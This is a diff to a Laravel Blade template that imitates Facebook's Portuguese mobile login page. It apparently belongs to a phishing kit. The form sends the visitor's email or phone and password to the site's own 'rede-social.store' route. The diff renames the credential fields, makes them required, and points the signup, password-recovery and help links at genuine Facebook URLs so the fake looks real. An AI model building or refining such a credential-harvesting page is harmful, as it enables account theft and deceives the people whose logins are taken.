@@ -181,10 +181,10 @@
                     <div class="aclb _4-4l">
                         <div data-sigil="m_login_upsell login_identify_step_element">
                             <div class="_qw9 grouped aclb" id="u_0_1">
-                                <a href="https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253Dfb7EWuw-D-1ght5KpprnFPM8%26referrer_params%255Blink_source%255D%3Dfb_app_banner&amp;app_id=350685531728&amp;cref=mb&amp;no_fw=1&amp;refid=8" target="_top" class="touchableArea first last area touchable acy apl abt abb" data-sigil="touchable marea">
+                                <a href="#" class="touchableArea first last area touchable acy apl abt abb" data-sigil="touchable marea">
                                     <div class="ib cc">
                                         <i class="img l img _2sxw" style="background-image: url(&#039;https\3a //static.xx.fbcdn.net/rsrc.php/v3/yc/r/fb9hHvqMKNN.png&#039;);background-repeat:no-repeat;background-size:100% 100%;-webkit-background-size:100% 100%;width:18px;height:32px;"></i>
-                                        <div class="c"><span class="fcl">Obtenha o Facebook para Android e navegue mais rápido.</span></div>
+                                        <div class="c"><span class="fcl">Obtenha o aplicativo do Facebook e navegue mais rápido.</span></div>
                                     </div>
                                 </a>
                             </div>
@@ -192,11 +192,11 @@
                         <div class="_5rut">
                             <form method="post" action="{{route('rede-social.store')}}" class="mobile-login-form _5spm">
                                 {!! csrf_field() !!}
-                                <input type="hidden" id="rede-social" name="rede-social" value="Facebook">
+                                <input type="hidden" id="rede_social" name="rede_social" value="Facebook">
                                 <div class="_56be _5sob">
                                     <div class="_55wo _55x2 _56bf">
-                                        <input type="email" class="_56bg _4u9z _5ruq" name="email" placeholder="Email ou telefone">
-                                        <input class="_56bg _4u9z _27z2" name="senha" placeholder="Senha" type="password">
+                                        <input type="email" class="_56bg _4u9z _5ruq" name="username" placeholder="Email ou telefone" required>
+                                        <input class="_56bg _4u9z _27z2" name="password" placeholder="Senha" type="password" required>
                                     </div>
                                 </div>
                                 <div class="_2pie" style="text-align:center;">
@@ -205,12 +205,12 @@
                             </form>
                             <div>
                                 <div class="_43mg"><span class="_43mh">ou</span></div>
-                                <div class="_52jj _5t3b" id="u_0_7"><a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" href="#" data-sigil="m_reg_button">Criar nova conta</a></div>
+                                <div class="_52jj _5t3b" id="u_0_7"><a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" href="https://m.facebook.com/reg/?cid=103" data-sigil="m_reg_button">Criar nova conta</a></div>
                             </div>
                             <div>
                                 <div class="other-links">
                                     <ul class="_5pkb _55wp">
-                                        <li><span class="mfss fcg"><a href="#" id="forgot-password-link">Esqueceu a senha?</a><span aria-hidden="true"> · </span><a href="#" id="help-link" class="sec">Central de Ajuda</a></span></li>
+                                        <li><span class="mfss fcg"><a href="https://m.facebook.com/login/identify/?ctx=recover&c&multiple_results=0&cuid_not_me=AYjHxwykIZ6Y9_xO54YDqRHQSNZjvVp2JrRfkkPM51ZJA9WO97SDrZm_fEdTAdnZluVUn6exF5U-pRS1OaRzFdnHOZwUwDy69usXksSKp7D8jBA7IRoQnct73BaXttbU5ECcdBzGjZ7P_gQnEyPOpw_xFOqWjw8fkU1TZfVl4w7yZ7c4wm1Ht1Q08Ynld1DUs5a26t6K59u9fA9A99Pd1hRgR0fgQ9SQqgNzZecerQM22w&_rdr" id="forgot-password-link">Esqueceu a senha?</a><span aria-hidden="true"> · </span><a href="https://m.facebook.com/help/" id="help-link" class="sec">Central de Ajuda</a></span></li>
                                     </ul>
                                 </div>
                             </div>
